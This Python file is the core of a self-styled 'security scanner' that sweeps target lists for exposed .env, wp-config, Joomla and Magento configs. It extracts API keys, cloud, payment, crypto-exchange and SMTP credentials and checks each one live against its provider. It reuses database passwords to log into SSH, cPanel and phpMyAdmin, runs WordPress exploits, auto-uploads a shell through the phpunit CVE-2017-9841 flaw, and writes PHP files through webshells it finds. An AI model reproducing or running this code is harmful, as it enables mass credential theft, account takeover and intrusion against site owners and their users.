"""
SB - Professional Security Scanner
Core scanning engine — session-pooled, pause/resume, threaded.
Authorized use only.
"""

import hashlib
import json as _json
import os as _os
import re
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

from extractor import (
    extract_from_env, detect_joomla_version, detect_php_version,
    extract_wp_users, extract_wp_config,
    extract_joomla_config, extract_magento_config,
    detect_webshell, scan_for_api_creds, extract_git_config,
    extract_aws_credentials_file,
)
from bruter import (
    upload_shell_phpunit, test_shell_upload,
)
from wp_exploits import run_wp_exploits
from service_checker import scan_services
from validator import (
    validate_twilio, validate_aws, validate_stripe,
    validate_plivo, validate_nexmo, validate_messagebird,
    validate_telnyx, validate_africas_talking,
    validate_sendgrid, validate_postmark, validate_mailgun,
    validate_brevo, validate_mandrill, validate_mailjet,
    validate_sparkpost, validate_elasticemail,
    validate_sinch, validate_bulksms, validate_clicksend,
    validate_telesign, validate_bandwidth, validate_smtp,
    validate_db_reachable,
    validate_shopify, validate_binance, validate_coinbase,
    validate_openai, validate_github_token, validate_huggingface,
    validate_anthropic, validate_slack,
    validate_google_api_key,
    set_redteam_email,
)
from js_crawler import crawl_js
from lfi_probe import probe_lfi
from run_manifest import start_manifest, finish_manifest
from active_checks import run_active_checks
from saver import save_finding, RESULTS_DIR
from target_utils import normalize_target, parse_targets

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Track targets already subjected to WP exploit suite (avoid duplicate runs)
_wp_exploited: set = set()
_wp_exploit_lock   = threading.Lock()

# Dedicated lock for atomic checkpoint writes — multiple target workers can
# complete close together and race on the checkpoint file without this.
_checkpoint_lock = threading.Lock()

# Round-robin User-Agent index
_ua_idx = 0
_ua_idx_lock = threading.Lock()

_FAST_CONNECT_TIMEOUT_CAP = 2.0
_MAX_TARGET_WORKERS = 20


def _request_timeout(timeout: int | float) -> tuple[float, float]:
    """Use short connect waits while preserving the user's read timeout."""
    read_timeout = max(1.0, float(timeout))
    connect_timeout = max(0.75, min(_FAST_CONNECT_TIMEOUT_CAP, read_timeout * 0.35))
    return (connect_timeout, read_timeout)


def _target_worker_count(target_count: int, path_threads: int) -> int:
    if target_count <= 1:
        return 1
    # Workers scale with target count, not path thread count.
    # floor(sqrt(target_count)) gives sensible parallelism without overwhelming small lists.
    import math
    workers = max(4, min(_MAX_TARGET_WORKERS, math.isqrt(target_count) + 2))
    return min(workers, target_count)



_SHELL_PROBE_PARAMS = ('cmd', 'c', 'exec', 'command', 'q', 'execute', 'run', 'pass')


def _rce_write_probe(full_url: str, session, timeout: int) -> dict | None:
    """
    When RCE is confirmed, use command execution to write a PHP probe file
    and verify it runs — confirms full write+exec capability via the shell.
    """
    base       = full_url.rsplit('/', 1)[0]
    probe_name = 'sb9p.php'
    probe_url  = f"{base}/{probe_name}"
    marker     = 'SB9PROBE_OK'
    php        = f'<?php echo "{marker}"; ?>'

    write_cmds = [
        f"file_put_contents('{probe_name}','{php}')",
        f"echo '{php}' > {probe_name}",
        f"printf '{php}' > {probe_name}",
    ]
    for param in _SHELL_PROBE_PARAMS:
        for cmd in write_cmds:
            try:
                session.get(full_url, params={param: cmd},
                            timeout=timeout, verify=False)
                r = session.get(probe_url, timeout=timeout, verify=False)
                if r.status_code == 200 and marker in r.text:
                    return {
                        'rce_write':   'CONFIRMED — PHP file written via command execution',
                        'probe_url':   probe_url,
                        'exec_method': param,
                    }
            except Exception:
                continue
    return None


def _validate_shell(full_url: str, session, timeout: int) -> bool:
    """Send a harmless echo probe to confirm the shell executes commands."""
    marker = 'SB9XPROBE'
    for param in _SHELL_PROBE_PARAMS:
        try:
            r = session.get(full_url, params={param: f'echo {marker}'},
                            timeout=timeout, verify=False, allow_redirects=True)
            if r.status_code == 200 and marker in r.text:
                return True
        except Exception:
            continue
    return False


_NO_CRED_KEYS = frozenset({
    'validation', 'validated', 'note', 'url', 'source_url', 'preview', 'indicators',
    'size_bytes', 'account_id', 'account_name', 'account_status', 'account_type',
    'date_created', 'user_id', 'arn', 'host', 'port', 'banner', 'files',
    'balance', 'currency', 'plan', 'plan_id', 'customer_id', 'http_status',
    'server_name', 'server_id', 'sender_count', 'quota', 'total_count',
    'first_domain', 'auto_reload', 'payment', 'amount', 'reputation',
    'hourly_quota', 'company_name', 'business_name', 'country', 'display_name',
    'available_credit', 'exec_confirmed', 'upload_form', 'upload_test_url',
    'upload_note', 'file_field', 'upload_exec', 'label',
})


def _probe_db_creds_on_services(host: str, user: str, pwd: str,
                                 finding_data: dict, timeout: int) -> None:
    """
    Cross-test: try DB credentials from .env against SSH (port 22) and
    cPanel (port 2083) on the same host.
    Real credentials are often reused across services on the same server.
    Mutates finding_data in-place on success; marks validated=True.
    """
    svc_to = min(timeout, 8)

    # ── SSH probe ─────────────────────────────────────────────────────────────
    try:
        import paramiko as _pm
        client = _pm.SSHClient()
        client.set_missing_host_key_policy(_pm.AutoAddPolicy())
        try:
            client.connect(host, port=22, username=user, password=pwd,
                           timeout=svc_to, allow_agent=False, look_for_keys=False,
                           banner_timeout=svc_to)
            client.close()
            finding_data['ssh_login']  = f'{user}@{host}:22 — DB creds reused on SSH'
            finding_data['validated']  = True
            return
        except _pm.AuthenticationException:
            pass   # SSH alive, wrong creds
        except Exception:
            pass   # SSH not reachable
        finally:
            try:
                client.close()
            except Exception:
                pass
    except ImportError:
        pass

    # ── cPanel probe (port 2083 HTTPS) ────────────────────────────────────────
    try:
        _sess = requests.Session()
        _sess.verify = False
        cp_url = f"https://{host}:2083/login/?login_only=1"
        _r = _sess.post(cp_url, data={'user': user, 'pass': pwd},
                        timeout=svc_to, allow_redirects=True)
        if ('cpsession' in _r.url or '/frontend/' in _r.url
                or any(c.name.startswith('cpsession') for c in _sess.cookies)):
            finding_data['cpanel_login'] = f'{user}@{host}:2083 — DB creds reused on cPanel'
            finding_data['validated']    = True
    except Exception:
        pass


def _probe_phpmyadmin(db_host: str, site_host: str, db_user: str, db_pass: str,
                      finding_data: dict, timeout: int) -> None:
    """
    When the DB host is external (not localhost/127.0.0.1), probe for phpMyAdmin
    at http(s)://{db_host} and http(s)://mysql.{site_domain}.
    Tries to log in with the extracted DB credentials.
    Mutates finding_data on success.
    """
    _PRIVATE = re.compile(
        r'^(localhost|127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.).*'
    )
    if _PRIVATE.match(db_host):
        return

    svc_to  = min(timeout, 8)
    _PMA_SIG = ['phpmyadmin', 'pma_', 'pmahomme', 'pmadb', 'phpMyAdmin']

    candidates = [
        f'http://{db_host}/phpmyadmin',
        f'https://{db_host}/phpmyadmin',
        f'http://{db_host}/pma',
        f'https://{db_host}/pma',
    ]
    # Also try mysql.<domain> derived from the site host
    site_domain = re.sub(r'^www\.', '', site_host)
    if site_domain and site_domain != db_host:
        candidates += [
            f'http://mysql.{site_domain}/phpmyadmin',
            f'http://mysql.{site_domain}',
        ]

    _s = requests.Session()
    _s.verify = False
    for base in candidates:
        try:
            r = _s.get(base, timeout=svc_to, allow_redirects=True)
            rl = r.text.lower()
            if not any(sig.lower() in rl for sig in _PMA_SIG):
                continue
            # Found a phpMyAdmin page — attempt login
            login_url = base.rstrip('/') + '/index.php'
            token_m = re.search(r'name="token"\s+value="([^"]+)"', r.text)
            post_data = {'pma_username': db_user, 'pma_password': db_pass,
                         'server': '1', 'lang': 'en'}
            if token_m:
                post_data['token'] = token_m.group(1)
            lr = _s.post(login_url, data=post_data, timeout=svc_to, allow_redirects=True)
            if 'logout' in lr.text.lower() or 'pma_token' in lr.text.lower():
                finding_data['phpmyadmin_login'] = (
                    f'{db_user}@{base} — DB creds work on phpMyAdmin'
                )
                finding_data['validated'] = True
                return
            # Mark as discovered even if login failed
            if 'phpmyadmin_url' not in finding_data:
                finding_data['phpmyadmin_url'] = base
        except Exception:
            continue


def _validate_env_finding(ef: dict, timeout: int) -> None:
    """
    Dispatch live validation for .env credential findings.
    Mutates ef['data'] in-place with result or sets validated=False.
    """
    d  = ef.get('data', {})
    ft = ef['type']

    # DB: TCP-reachability probe (does NOT verify password). REACHABLE means
    # the extracted host:port is live; INTERNAL/UNREACHABLE means the cred
    # may be valid but the target isn't externally testable.
    if ft == 'db':
        v = validate_db_reachable(d.get('DB_HOST'), d.get('DB_PORT'),
                                  d.get('DB_CONNECTION'), timeout)
        if v:
            d.update(v)
            reachability = v.get('db_reachability', '')
            if reachability.startswith('REACHABLE'):
                d['validated'] = True
            elif reachability.startswith('INTERNAL'):
                d['validated'] = None
            else:
                d['validated'] = False
        else:
            d['validated'] = False

        # Cross-test: try the same DB username/password against SSH and cPanel.
        # Many shared-hosting servers reuse the DB password for SSH/cPanel access.
        db_user = d.get('DB_USERNAME')
        db_pass = d.get('DB_PASSWORD')
        db_host = d.get('DB_HOST', '')
        if db_user and db_pass and len(db_pass) > 3:
            _site_host = re.sub(r'https?://', '', ef.get('url', '')).split('/')[0].split(':')[0]
            if _site_host:
                _probe_db_creds_on_services(_site_host, db_user, db_pass, d, timeout)
            # If the DB is on an external host, also probe phpMyAdmin there
            if db_host and db_host not in ('localhost', '127.0.0.1', _site_host):
                _probe_phpmyadmin(db_host, _site_host, db_user, db_pass, d, timeout)
        return

    if ft == 'twilio':
        sid   = d.get('TWILIO_ACCOUNT_SID') or d.get('TWILIO_SID')
        token = d.get('TWILIO_AUTH_TOKEN')  or d.get('TWILIO_TOKEN')
        v = validate_twilio(sid, token, timeout)
    elif ft == 'aws':
        v = validate_aws(d.get('AWS_ACCESS_KEY_ID'), d.get('AWS_SECRET_ACCESS_KEY'),
                         d.get('AWS_DEFAULT_REGION', 'us-east-1'), timeout)
    elif ft == 'stripe':
        sk = d.get('STRIPE_SECRET') or d.get('STRIPE_PRIVATE_KEY') or d.get('STRIPE_KEY')
        v = validate_stripe(sk, timeout)
    elif ft == 'mailgun':
        v = validate_mailgun(d.get('MAILGUN_API_KEY') or d.get('MAILGUN_SECRET'),
                             d.get('MAILGUN_DOMAIN', ''), timeout)
    elif ft == 'plivo':
        v = validate_plivo(d.get('PLIVO_AUTH_ID'), d.get('PLIVO_AUTH_TOKEN'), timeout)
    elif ft == 'brevo':
        ak = (d.get('BREVO_API_KEY') or d.get('SENDINBLUE_API_KEY')
              or d.get('BREVO_SMTP_KEY') or d.get('BREVO_API_V3_KEY'))
        v = validate_brevo(ak, timeout)
    elif ft == 'nexmo':
        key = d.get('NEXMO_API_KEY') or d.get('NEXMO_KEY') or d.get('VONAGE_API_KEY')
        sec = d.get('NEXMO_API_SECRET') or d.get('NEXMO_SECRET') or d.get('VONAGE_API_SECRET')
        v = validate_nexmo(key, sec, timeout)
    elif ft == 'messagebird':
        v = validate_messagebird(d.get('MESSAGEBIRD_ACCESS_KEY') or
                                 d.get('MESSAGEBIRD_API_KEY'), timeout)
    elif ft == 'telnyx':
        v = validate_telnyx(d.get('TELNYX_API_KEY'), timeout)
    elif ft == 'africas_talking':
        v = validate_africas_talking(d.get('AFRICASTALKING_USERNAME') or d.get('AT_USERNAME'),
                                     d.get('AFRICASTALKING_API_KEY') or d.get('AT_API_KEY'),
                                     timeout)
    elif ft == 'sendgrid':
        v = validate_sendgrid(d.get('SENDGRID_API_KEY') or d.get('SENDGRID_KEY'), timeout)
    elif ft == 'postmark':
        tok = (d.get('POSTMARK_SERVER_TOKEN') or d.get('POSTMARK_API_TOKEN')
               or d.get('POSTMARK_TOKEN'))
        v = validate_postmark(tok, timeout)
    elif ft == 'mandrill':
        v = validate_mandrill(d.get('MANDRILL_API_KEY') or d.get('MANDRILL_KEY') or
                              d.get('MAILCHIMP_TRANSACTIONAL_KEY'), timeout)
    elif ft == 'mailjet':
        pub  = d.get('MAILJET_API_KEY') or d.get('MJ_APIKEY_PUBLIC')
        priv = d.get('MAILJET_API_SECRET') or d.get('MJ_APIKEY_PRIVATE')
        v = validate_mailjet(pub, priv, timeout)
    elif ft == 'sparkpost':
        v = validate_sparkpost(d.get('SPARKPOST_API_KEY') or d.get('SPARKPOST_KEY'), timeout)
    elif ft == 'elasticemail':
        v = validate_elasticemail(d.get('ELASTICEMAIL_API_KEY') or
                                  d.get('ELASTIC_EMAIL_API_KEY'), timeout)
    elif ft == 'sinch':
        v = validate_sinch(d.get('SINCH_SERVICE_PLAN_ID'), d.get('SINCH_API_TOKEN'), timeout)
    elif ft == 'bulksms':
        v = validate_bulksms(d.get('BULKSMS_USERNAME', ''),
                             d.get('BULKSMS_PASSWORD'), d.get('BULKSMS_TOKEN'), timeout)
    elif ft == 'clicksend':
        v = validate_clicksend(d.get('CLICKSEND_USERNAME'), d.get('CLICKSEND_API_KEY'), timeout)
    elif ft == 'telesign':
        v = validate_telesign(d.get('TELESIGN_CUSTOMER_ID'), d.get('TELESIGN_API_KEY'), timeout)
    elif ft == 'bandwidth':
        v = validate_bandwidth(
            d.get('BANDWIDTH_ACCOUNT_ID'),
            d.get('BANDWIDTH_API_TOKEN') or d.get('BANDWIDTH_USERNAME'),
            d.get('BANDWIDTH_API_SECRET') or d.get('BANDWIDTH_PASSWORD'),
            timeout,
        )
    elif ft == 'mail':
        host = (d.get('MAIL_HOST') or d.get('SMTP_HOST')
                or d.get('EMAIL_HOST', ''))
        try:
            port = int(d.get('MAIL_PORT') or d.get('SMTP_PORT')
                       or d.get('EMAIL_PORT') or 587)
        except (ValueError, TypeError):
            port = 587
        user = (d.get('MAIL_USERNAME') or d.get('SMTP_USERNAME')
                or d.get('EMAIL_HOST_USER', ''))
        pwd  = (d.get('MAIL_PASSWORD') or d.get('SMTP_PASSWORD')
                or d.get('EMAIL_HOST_PASSWORD', ''))
        enc  = (d.get('MAIL_ENCRYPTION') or d.get('SMTP_ENCRYPTION')
                or ('tls' if d.get('EMAIL_USE_TLS', '').lower() in ('1', 'true') else '')
                or ('ssl' if d.get('EMAIL_USE_SSL',  '').lower() in ('1', 'true') else ''))
        from_addr = (d.get('MAIL_FROM_ADDRESS') or d.get('SMTP_FROM')
                     or d.get('DEFAULT_FROM_EMAIL', ''))
        v = validate_smtp(host, port, user, pwd, timeout,
                          encryption=enc, from_addr=from_addr)
    elif ft == 'shopify':
        token = (d.get('SHOPIFY_ACCESS_TOKEN') or
                 d.get('SHOPIFY_ADMIN_API_ACCESS_TOKEN') or
                 d.get('SHOPIFY_API_KEY'))
        shop  = d.get('SHOPIFY_SHOP') or d.get('SHOPIFY_DOMAIN', '')
        v = validate_shopify(token, shop, timeout)
    elif ft == 'binance':
        v = validate_binance(
            d.get('BINANCE_API_KEY') or d.get('BINANCE_KEY'),
            d.get('BINANCE_API_SECRET') or d.get('BINANCE_SECRET_KEY') or d.get('BINANCE_SECRET'),
            timeout,
        )
    elif ft == 'coinbase':
        v = validate_coinbase(
            d.get('COINBASE_API_KEY') or d.get('COINBASE_COMMERCE_API_KEY') or
            d.get('CB_API_KEY') or d.get('CB_COMMERCE_KEY'),
            timeout,
        )
    elif ft == 'paxful':
        d['validated'] = None   # no public endpoint to verify against
        d['validation'] = 'ACCESSIBLE — Paxful key found (manual verification needed)'
        return
    else:
        return  # no validator for this type

    if v:
        d.update(v)
        # Some validators (shopify, binance, coinbase) set validated=False on explicit
        # API rejection — don't override that with True.
        if 'validated' not in v:
            d['validated'] = True
    else:
        d['validation'] = 'UNVERIFIED — could not confirm'
        d['validated']  = False


USER_AGENTS = (
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
    '(KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 '
    '(KHTML, like Gecko) Version/17.6 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) '
    'Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
    '(KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
)

HEADERS = {
    'User-Agent':      USER_AGENTS[0],
    'Accept':          'text/html,application/xhtml+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection':      'keep-alive',
}

ENV_INDICATORS = (
    # Laravel / generic PHP app
    'APP_NAME', 'APP_ENV', 'APP_KEY', 'APP_SECRET',
    # Database
    'DB_HOST', 'DB_DATABASE', 'DB_USERNAME', 'DB_PASSWORD',
    'DATABASE_URL', 'DATABASE_HOST',
    # Mail / SMTP
    'MAIL_HOST', 'MAIL_PASSWORD', 'SMTP_HOST', 'SMTP_PASSWORD',
    # AWS
    'AWS_ACCESS', 'AWS_SECRET', 'AWS_BUCKET',
    # SMS / Voice
    'TWILIO_', 'PLIVO_', 'NEXMO_', 'VONAGE_', 'SINCH_',
    'TELNYX_', 'MESSAGEBIRD_', 'BANDWIDTH_', 'BULKSMS_',
    'CLICKSEND_', 'TELESIGN_', 'AFRICASTALKING_',
    # Payment / Commerce
    'STRIPE_', 'PAYPAL_', 'BRAINTREE_', 'RAZORPAY_',
    'PAYSTACK_', 'FLUTTERWAVE_', 'SQUARE_',
    'SHOPIFY_', 'BINANCE_', 'COINBASE_', 'PAXFUL_',
    'CB_API_KEY', 'CB_COMMERCE_KEY',
    # Email service providers
    'MAILGUN_', 'SENDGRID_', 'POSTMARK_', 'BREVO_',
    'SENDINBLUE_', 'MANDRILL_', 'SPARKPOST_', 'MAILJET_',
    'ELASTICEMAIL_',
    # Other common credentials
    'REDIS_PASSWORD', 'PUSHER_', 'FIREBASE_', 'OPENAI_API_KEY',
    'ANTHROPIC_API_KEY', 'GOOGLE_API_KEY', 'SLACK_', 'TELEGRAM_',
    'SECRET_KEY', 'API_KEY', 'ACCESS_TOKEN', 'AUTH_TOKEN',
)

WP_CONFIG_PATHS = (
    'wp-config.php.bak', 'wp-config.php~', 'wp-config.txt',
    'wp-config.php.save', 'wp-config.php.swp', 'wp-config.php.old',
)

SHELL_NAMES = (
    'shell.php', 'cmd.php', 'c99.php', 'r57.php', 'b374k.php',
    'wso.php', 'alfa.php', 'indoxploit.php', 'webshell.php',
    'backdoor.php', 'ghost.php', 'filesMan.php', 'mini.php',
    'vodka.php', 'symlink.php', 'flash.php',
)


# WAF / CDN header fingerprints — IPs behind these never expose .env files
_WAF_HEADER_SIGNS = frozenset({
    'cf-ray', 'cf-cache-status',                      # Cloudflare
    'x-sucuri-id', 'x-sucuri-cache',                  # Sucuri
    'x-iinfo', 'x-cdn',                               # Incapsula / Imperva
    'x-akamai-transformed', 'x-check-cacheable',      # Akamai
    'x-shield',                                        # various WAFs
    'x-varnish',                                       # Varnish CDN
    'fastly-restarts', 'x-served-by',                 # Fastly
    'x-cache-hits', 'x-timer',                        # Fastly / CDN
})
_WAF_SERVER_SIGNS = ('cloudflare', 'sucuri', 'imperva', 'incapsula',
                     'fastly', 'akamai', 'squid', 'barracuda')


def _is_waf(resp_headers: dict) -> bool:
    lower = {k.lower() for k in resp_headers}
    if lower & _WAF_HEADER_SIGNS:
        return True
    server = resp_headers.get('Server', resp_headers.get('server', '')).lower()
    return any(w in server for w in _WAF_SERVER_SIGNS)


def make_session(proxy: str | None = None) -> requests.Session:
    global _ua_idx
    with _ua_idx_lock:
        ua = USER_AGENTS[_ua_idx % len(USER_AGENTS)]
        _ua_idx += 1
    s = requests.Session()
    a = requests.adapters.HTTPAdapter(pool_connections=32, pool_maxsize=64, max_retries=0)
    s.mount('https://', a)
    s.mount('http://', a)
    hdrs = dict(HEADERS)
    hdrs['User-Agent'] = ua
    s.headers.update(hdrs)
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    return s


def _fetch(session, url, timeout):
    req_timeout = _request_timeout(timeout)
    try:
        return session.get(url, timeout=req_timeout, verify=False, allow_redirects=True)
    except requests.exceptions.SSLError:
        try:
            return session.get(url.replace('https://', 'http://', 1),
                               timeout=req_timeout, verify=False, allow_redirects=True)
        except Exception:
            return None
    except Exception:
        return None


def normalize_url(url: str) -> str:
    """Backward-compatible name for strict base-target normalization."""
    return normalize_target(url)


def _analyze(base_url, path, status, content, resp_headers, session, timeout) -> list[dict]:
    if status in (404, 410):
        return []
    if status in (301, 302, 307, 308) and len(content) < 80:
        return []

    full_url = base_url + path
    cl       = content.lower()
    findings = []

    # ── WordPress CVE exploit suite (fires once per base_url) ─────────────
    def _maybe_run_wp_exploits():
        with _wp_exploit_lock:
            if base_url in _wp_exploited:
                return []
            _wp_exploited.add(base_url)
        return run_wp_exploits(base_url, session, timeout)

    # ── .env exposure ──────────────────────────────────────────────────────
    if '.env' in path:
        if status == 200 and any(k in content for k in ENV_INDICATORS):
            env_findings = extract_from_env(base_url, path, content)
            for ef in env_findings:
                _validate_env_finding(ef, timeout)
            findings.extend(env_findings)

    # ── Laravel APP_DEBUG=true page (env vars exposed in HTML table) ─────────
    elif status in (200, 500) and any(k in content for k in
                                      ['<td>APP_KEY</td>', '<td>APP_ENV</td>',
                                       '<td>DB_PASSWORD</td>', '<td>APP_DEBUG</td>']):
        env_findings = extract_from_env(base_url, path, content)
        for ef in env_findings:
            _validate_env_finding(ef, timeout)
        if env_findings:
            findings.extend(env_findings)
        else:
            findings.append({
                'type': 'laravel', 'url': base_url, 'path': path,
                'data': {'note': 'Laravel APP_DEBUG=true — env table exposed (no creds parsed)',
                         'url': full_url, 'validated': None},
            })

    # ── WordPress wp-config backup ─────────────────────────────────────────
    elif status == 200 and any(p in path for p in WP_CONFIG_PATHS):
        creds = extract_wp_config(content)
        if creds:
            creds['note'] = 'wp-config.php backup exposed — DB credentials extracted'
            creds['url']  = full_url
        else:
            creds = {'note': 'wp-config.php backup accessible', 'url': full_url,
                     'preview': content[:400]}
        # Credentials extracted from the config leak are saved as-is.
        # Wordlist brute-forcing is not attempted — credentials in hand
        # are more valuable than guessed ones, and guessing wastes time.
        creds['validated'] = None if not creds.get('DB_PASSWORD') else True
        findings.append({'type': 'wordpress', 'url': base_url, 'path': path, 'data': creds})
        findings.extend(_maybe_run_wp_exploits())

    # ── Laravel log ────────────────────────────────────────────────────────
    elif 'laravel.log' in path and status == 200 and len(content) > 200:
        findings.append({
            'type': 'laravel', 'url': base_url, 'path': path,
            'data': {'note': 'Laravel log file exposed', 'size_bytes': len(content),
                     'preview': content[:400].replace('\n', ' | ')},
        })

    # ── Laravel Telescope — only report when API returns actual request data ─
    elif 'telescope' in path and status == 200 and 'telescope' in cl:
        if '/telescope/api/' in path and len(content) > 200:
            findings.append({'type': 'laravel', 'url': base_url, 'path': path,
                             'data': {'note': 'Laravel Telescope — request data accessible',
                                      'url': full_url, 'preview': content[:400]}})

    # ── Laravel Horizon — only report when API returns queue job data ──────
    elif 'horizon' in path and status == 200 and ('horizon' in cl or 'queue' in cl):
        if '/horizon/api/' in path and len(content) > 100:
            findings.append({'type': 'laravel', 'url': base_url, 'path': path,
                             'data': {'note': 'Laravel Horizon — job queue data accessible',
                                      'url': full_url, 'preview': content[:400]}})

    # Ignition endpoint — detection only, dropped

    # ── phpunit RCE CVE-2017-9841 → auto shell upload ─────────────────────
    elif 'eval-stdin.php' in path and status == 200:
        result = upload_shell_phpunit(base_url, path, session, timeout)
        if result:
            # validated=True  → shell dropped and executing
            # validated=False → endpoint live but all drop paths blocked
            result['url'] = full_url
            findings.append({'type': 'shell', 'url': base_url, 'path': path, 'data': result})
        else:
            # endpoint not reachable / not a real phpunit install
            findings.append({
                'type': 'laravel', 'url': base_url, 'path': path,
                'data': {'note': 'CVE-2017-9841 phpunit endpoint detected (not exploitable)',
                         'url': full_url, 'validated': False},
            })

    # ── Joomla configuration.php exposure ─────────────────────────────────
    elif status == 200 and 'configuration.php' in path and '$db' in content:
        creds = extract_joomla_config(content) or {}
        creds['note'] = 'Joomla configuration.php exposed'
        creds['url']  = full_url
        # Save the extracted config credentials directly — no wordlist brute-force.
        creds['validated'] = None if not creds.get('password') else True
        findings.append({'type': 'joomla', 'url': base_url, 'path': path, 'data': creds})

    # Joomla admin panel (login page only) — dropped, no actionable output

    # ── WordPress ──────────────────────────────────────────────────────────
    elif status == 200 and any(p in path for p in
                               ['/wp-login', '/wp-admin', '/xmlrpc.php', '/wp-json']):
        if any(k in cl for k in ['wordpress', 'wp-content', 'wp-includes', 'xmlrpc']):
            # Skip Amazon S3 / CloudFront — their XML error bodies can contain
            # 'wordpress' or 'wp-content' and trigger false positives
            _srv = resp_headers.get('Server', '')
            _is_amz = ('AmazonS3' in _srv or 'CloudFront' in _srv or 'Amazon' in _srv
                       or any(h.lower().startswith('x-amz-') for h in resp_headers))
            if not _is_amz:
                # install.php accessible on a live site = re-installation vector
                if path.rstrip('/').endswith('/wp-admin/install.php') and (
                        'already' in content.lower() or 'installed' in content.lower()):
                    findings.append({
                        'type': 'wordpress', 'url': base_url, 'path': path,
                        'data': {'note': 'WordPress install.php accessible on live site — re-installation possible',
                                 'url': full_url, 'validated': None},
                    })
                # Only report if we got actual user data or CVE exploits fired
                if '/wp-json/wp/v2/users' in path:
                    users = extract_wp_users(content)
                    if users:
                        findings.append({
                            'type': 'wordpress', 'url': base_url, 'path': path,
                            'data': {'note': 'WordPress user enumeration via REST API',
                                     'users': str(users), 'url': full_url, 'validated': True},
                        })
                findings.extend(_maybe_run_wp_exploits())

    # ── Magento config exposure ────────────────────────────────────────────
    elif status == 200 and any(p in path for p in
                               ['/downloader', '/app/etc/local.xml', '/app/etc/env.php']):
        if any(k in cl for k in ['magento', '<host>', '<dbname>', 'mage_']):
            creds = extract_magento_config(content) or {}
            creds['note'] = 'Magento config exposed'
            creds['url']  = full_url
            findings.append({'type': 'db', 'url': base_url, 'path': path, 'data': creds})

    # Magento admin login page — dropped, no actionable output without creds

    # ── Spring Boot Actuator — only report when creds are present ─────────
    elif 'actuator' in path and status == 200:
        if 'env' in path:
            creds = scan_for_api_creds(content)
            if creds:
                data = {'note': 'Spring Boot Actuator /env — credentials exposed',
                        'url': full_url, 'preview': content[:400]}
                data.update(creds)
                findings.append({'type': 'exposure', 'url': base_url, 'path': path, 'data': data})

    # ── SSH private key ────────────────────────────────────────────────────
    elif '/.ssh/' in path and status == 200 and '-----BEGIN' in content:
        findings.append({
            'type': 'exposure', 'url': base_url, 'path': path,
            'data': {'note': 'SSH private key exposed', 'url': full_url,
                     'preview': content[:300]},
        })

    # Swagger/API docs — dropped (no creds, just schema info)

    # ── Jenkins — only report when dashboard is unauthenticated ───────────
    elif 'jenkins' in path and status == 200 and 'jenkins' in cl:
        # Login page = not useful. Dashboard/job list = real access.
        if any(k in cl for k in ['dashboard', 'all jobs', 'build history',
                                  'manage jenkins', 'new item', 'createitem']):
            findings.append({'type': 'exposure', 'url': base_url, 'path': path,
                             'data': {'note': 'Jenkins dashboard — unauthenticated access',
                                      'url': full_url}})

    # ── Jupyter Notebook ───────────────────────────────────────────────────
    elif status == 200 and any(p in path for p in ['/jupyter', '/api/kernels']):
        if any(k in cl for k in ['jupyter', 'kernels', 'notebook']):
            findings.append({
                'type': 'exposure', 'url': base_url, 'path': path,
                'data': {'note': 'Jupyter Notebook exposed — potential unauthenticated RCE',
                         'url': full_url},
            })

    # ── Elasticsearch ──────────────────────────────────────────────────────
    elif status == 200 and any(p in path for p in ['/_cat/', '/_cluster/', '/_nodes']):
        findings.append({
            'type': 'exposure', 'url': base_url, 'path': path,
            'data': {'note': 'Elasticsearch API exposed', 'url': full_url,
                     'preview': content[:300]},
        })

    # ── Tomcat Manager — only when accessible without auth (200 = open) ───
    elif status == 200 and any(p in path for p in ['/manager/html', '/host-manager/html']):
        if any(k in cl for k in ['tomcat', 'manager', 'apache']):
            findings.append({'type': 'exposure', 'url': base_url, 'path': path,
                             'data': {'note': 'Tomcat Manager — unauthenticated access (WAR upload possible)',
                                      'url': full_url}})

    # ── Shell path detection ───────────────────────────────────────────────
    elif status == 200 and any(s in path.lower() for s in SHELL_NAMES):
        indicators  = detect_webshell(content)
        rce_ok      = _validate_shell(full_url, session, timeout)
        upload_info = test_shell_upload(full_url, session, timeout) if rce_ok else {}
        rce_write   = _rce_write_probe(full_url, session, timeout) if rce_ok else None
        up_exec     = upload_info.get('exec_confirmed', False)
        up_url      = upload_info.get('upload_content_url', '')
        rce_written = bool(rce_write)
        # True  = upload/write exec confirmed  (✓ VALID)
        # None  = shell accessible but exec not achieved  (? ACCESSIBLE)
        # False = shell not responding at all  (✗ NOT ACCESSIBLE)
        final_val   = True if (up_exec or rce_written) else (None if rce_ok else False)
        shell_data  = {
            'note':               ('Webshell — upload/write EXEC confirmed' if (up_exec or rce_written)
                                   else ('Webshell ACCESSIBLE — RCE echo confirmed, exec blocked'
                                         if rce_ok else 'Webshell detected at known path')),
            'shell_url':          full_url,
            'cmd_access':         full_url + '?cmd=whoami',
            'indicators':         ', '.join(indicators[:5]) if indicators else 'accessible',
            'size_bytes':         len(content),
            'validated':          final_val,
            'upload_status':      upload_info.get('note', 'NOT ATTEMPTED — RCE not confirmed'),
            'upload_content_url': up_url if up_url else 'N/A',
            'upload_exec':        'YES — PHP executing' if up_exec else 'NO',
            'rce_write':          (rce_write.get('rce_write', '') if rce_write else
                                   ('FAILED — could not write probe file'
                                    if rce_ok else 'NOT ATTEMPTED')),
            'rce_probe_url':      rce_write.get('probe_url', '') if rce_write else '',
        }
        findings.append({'type': 'shell', 'url': base_url, 'path': path, 'data': shell_data})

    # ── Log file — only report when credentials are found inside ──────────
    elif status == 200 and any(p in path for p in
                               ['/logs/', '/log/', '/error_log', '/debug.log', '/application.log']):
        if len(content) > 100:
            creds = scan_for_api_creds(content)
            if creds:
                findings.append({
                    'type': 'exposure', 'url': base_url, 'path': path,
                    'data': {'note': 'Log file exposed — credentials found',
                             'url': full_url, 'size_bytes': len(content),
                             'preview': content[:300].replace('\n', ' | '), **creds},
                })

